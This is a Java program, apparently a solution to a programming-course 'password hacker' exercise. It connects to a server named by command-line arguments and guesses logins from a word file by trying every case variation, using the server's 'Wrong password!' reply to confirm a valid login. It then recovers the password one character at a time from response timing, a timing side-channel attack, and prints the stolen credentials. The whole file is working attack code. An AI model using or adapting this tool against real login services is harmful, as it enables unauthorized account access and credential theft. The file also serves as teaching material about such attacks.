package hacker;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;

import java.io.*;
import java.net.InetAddress;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;

@SuppressWarnings("unused")
public class Main {
    private static final String LETTERS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    private static final List<String> DATABASE = new ArrayList<>();
    private static final Gson gson = new GsonBuilder()
            .setPrettyPrinting()
            .serializeNulls()
            .create();
    private static final String PASSWORD_FILE = "passwords.txt";
    private static final String LOGIN_FILE = "logins.txt";

    private static final String RUNNING_DATABASE_PATH = System.getProperty("user.dir") +
            File.separator + "src" +
            File.separator + "hacker" +
            File.separator + LOGIN_FILE;

    private static final List<String> RESPONSES = List.of("Connection success!", "Too many attempts to connect!");

    private enum Message {
        WRONG_LOGIN("Wrong login!"),
        WRONG_PASSWORD("Wrong password!"),
        EXCEPTION_DURING_LOGIN("Exception happened during login"),
        CONNECTION_SUCCESS("Connection success!");

        private final String value;
        Message(String value) {
            this.value = value;
        }
        public boolean compare(String response) {
            return this.value.equals(response);
        }
    }

    private static String generatePassword(int i) {
        StringBuilder stringBuilder = new StringBuilder();
        while (i > 0) {
            i--;
            stringBuilder.append(LETTERS.charAt((i) % LETTERS.length()));
            i /= LETTERS.length();
        }
        return stringBuilder.reverse().toString();
    }

    private static void fillDatabase() {
        try {
            BufferedReader bufferedReader = new BufferedReader(new FileReader(RUNNING_DATABASE_PATH));
            DATABASE.addAll(bufferedReader.lines().toList());
        } catch (FileNotFoundException fileNotFoundException) {
            fileNotFoundException.printStackTrace();
        }
    }

    private static void recursivelyFillVariation(String word, int index, String overhead, List<String> list) {
        if (index == word.length()) {
            list.add(overhead);
            return;
        }

        if (word.charAt(index) >= '0' && word.charAt(index) <= '9') {
            recursivelyFillVariation(word, index + 1, overhead + word.charAt(index), list);
        } else {
            String lowercase = String.valueOf(word.charAt(index)).toLowerCase();
            recursivelyFillVariation(word, index + 1, overhead + lowercase, list);

            String uppercase = String.valueOf(word.charAt(index)).toUpperCase();
            recursivelyFillVariation(word, index + 1, overhead + uppercase, list);
        }
    }

    private static List<String> getAllVariations(String word) {
        List<String> list = new ArrayList<>();
        recursivelyFillVariation(word, 0, "", list);
        return list;
    }

    private static void listen(String[] args) {
        try (Socket socket = new Socket(InetAddress.getByName(args[0]), Integer.parseInt(args[1]));
             DataInputStream dataInputStream = new DataInputStream(socket.getInputStream());
             DataOutputStream dataOutputStream = new DataOutputStream(socket.getOutputStream())) {
            String login = null;
            int loginIndex = 0;

            loginLoop: do {
                List<String> variations = getAllVariations(DATABASE.get(loginIndex++));
                for (String variation : variations) {
                    dataOutputStream.writeUTF(gson.toJson(new Credentials(variation, "")));
                    if (Message.WRONG_PASSWORD.compare(gson.fromJson(dataInputStream.readUTF(), Response.class).result)) {
                        login = variation;
                        break loginLoop;
                    }
                }
            } while (loginIndex < DATABASE.size());

            int passwordIndex = 0;
            StringBuilder password = new StringBuilder();

            do {
                String endLetter = String.valueOf(LETTERS.charAt(passwordIndex++));

                // Storing the start time of the request.
                long startTime = System.currentTimeMillis();

                dataOutputStream.writeUTF(gson.toJson(new Credentials(login, password + endLetter)));
                String response = gson.fromJson(dataInputStream.readUTF(), Response.class).result;

                if (System.currentTimeMillis() - startTime > 50L) {
                    password.append(endLetter);
                    passwordIndex = 0;
                    continue;
                }

                if (Message.CONNECTION_SUCCESS.compare(response)) {
                    password.append(endLetter);
                    break;
                }
            } while (passwordIndex < LETTERS.length());

            System.out.println(gson.toJson(new Credentials(login, password.toString())));

        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        fillDatabase();
        listen(args);
    }
}

record Credentials(String login, String password) {}

class Response {
    public String result;
}
